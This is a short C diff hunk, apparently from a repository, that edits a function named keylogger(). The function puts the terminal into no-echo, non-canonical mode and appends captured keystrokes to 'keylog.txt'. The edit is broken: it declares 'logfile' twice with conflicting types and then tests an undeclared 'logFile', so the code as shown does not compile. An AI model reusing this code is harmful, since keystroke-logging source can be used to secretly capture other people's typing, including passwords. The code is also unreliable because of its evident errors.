@@ -462,7 +462,11 @@ void keylogger() {
     newt.c_lflag &= ~(ICANON | ECHO);
     tcsetattr(STDIN_FILENO, TCSANOW, &newt);
 
-    FILE *logFile = fopen(logfile ? logfile : "keylog.txt", "a");
+    //declare logfile
+    const char *logfile = "keylog.txt";
+    FILE *logfile = fopen("keylog.txt", "a");
+    //FILE *logFile = fopen(logfile ? logfile : "keylog.txt", "a");
+    
     if (!logFile) {
         perror("Error opening log file");
         tcsetattr(STDIN_FILENO, TCSANOW, &oldt);
